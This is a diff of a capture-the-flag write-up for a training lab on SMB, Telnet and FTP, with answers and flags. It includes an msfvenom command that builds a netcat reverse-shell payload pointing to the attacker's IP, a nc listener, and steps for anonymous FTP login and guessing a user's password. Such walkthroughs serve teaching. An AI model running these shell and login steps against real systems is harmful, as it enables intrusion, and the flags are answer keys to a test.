@@ -10,7 +10,7 @@ Before starting, I’d recommend checking out the reading material provided with
 
 ## Task 2 Understanding SMB
 
-**Answer the questions below**
+
 
 **What does SMB stand for?**
 
@@ -31,7 +31,7 @@ Before starting, I’d recommend checking out the reading material provided with
 
 ##  Task 3 Enumerating SMB
 
-**Answer the questions below**
+
 
 Conduct an nmap scan of your choosing, How many ports are open?
 
@@ -62,7 +62,7 @@ root@ip-10-10-113-212:~# nmap -sS 10.10.21.250
 
 ##  Task 4 Exploiting SMB
 
-**Answer the questions below**
+
 
 **What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?**
 
@@ -116,7 +116,7 @@ What is the smb.txt flag?
 
 ##  Task 5 Understanding Telnet
 
-**Answer the questions below**
+
 
 **What is Telnet?**    
 
@@ -137,7 +137,7 @@ What is the smb.txt flag?
 
 ##  Task 6 Enumerating Telnet
 
-**Answer the questions below**
+
 
 **How many ports are open on the target machine?**    
 
@@ -176,6 +176,10 @@ What is the smb.txt flag?
 
 **Okay, let's try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above.**
 
+```
+telnet 10.10.127.187 8012
+```
+
 >  No answer needed
 
 **Great! It's an open telnet connection! What welcome message do we receive?**
@@ -195,10 +199,17 @@ Start a tcpdump listener on your local machine.
 If using your own machine with the OpenVPN connection, use:
 
 sudo tcpdump ip proto \\icmp -i tun0
+
 If using the AttackBox, use:
 
 sudo tcpdump ip proto \\icmp -i ens5
+
 This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.
+```
+sudo tcpdump ip proto \\icmp -i tun0
+```
+_ip proto \\icmp_: Capture packets that use the ICMP protocol (Filer Expression)
+_-i_: Capture packets from a specific interface
 
 >  No answer needed
 
@@ -210,7 +221,7 @@ This starts a tcpdump listener, specifically listening for ICMP traffic, which p
 
 >  No answer needed
 
-We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:
+**We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:**
 
 "msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"
 
@@ -220,6 +231,9 @@ lport = the port to listen on (this is the port on your machine)
 R = export the payload in raw format
 
 **What word does the generated payload start with?**
+```
+msfvenom -p cmd/unix/reverse_netcat lhost=10.6.67.160 lport=4444 R
+```
 
 > mkfifo
 
@@ -228,7 +242,6 @@ R = export the payload in raw format
 >  "nc -lvp [listening port]"
 
 **What would the command look like for the listening port we selected in our payload?**
-
 
 >  nc -lvp 4444
 
@@ -239,3 +252,68 @@ R = export the payload in raw format
 **Success! What is the contents of flag.txt?**
 
 >  THM{y0u_g0t_th3_t3ln3t_fl4g}
+
+
+##  Task 8 Understanding FTP
+
+**What communications model does FTP use?**
+
+>  client-server
+
+**What's the standard FTP port?**
+
+>  21
+
+**How many modes of FTP connection are there?**   
+
+>  2
+> 
+
+##  Task 9 Enumerating FTP
+
+Run an nmap scan of your choice.
+
+How many ports are open on the target machine? 
+
+2
+
+What port is ftp running on?
+
+21
+
+What variant of FTP is running on it?  
+
+vsftpd
+
+Great, now we know what type of FTP server we're dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing "ftp [IP]" into the console, and entering "anonymous", and no password when prompted.
+
+What is the name of the file in the anonymous FTP directory?
+
+
+
+PUBLIC_NOTICE.txt
+
+What do we think a possible username
+could be?
+mike
+
+Great! Now we've got details about the FTP server and, crucially, a possible username. Let's see what we can do with that...
+
+No answer needed
+
+
+##  Task 10 Exploiting FTP
+
+What is the password for the user "mike"?
+
+password
+
+Bingo! Now, let's connect to the FTP server as this user using "ftp [IP]" and entering the credentials when prompted
+
+No answer needed
+
+What is ftp.txt?
+
+THM{y0u_g0t_th3_ftp_fl4g}
+
+
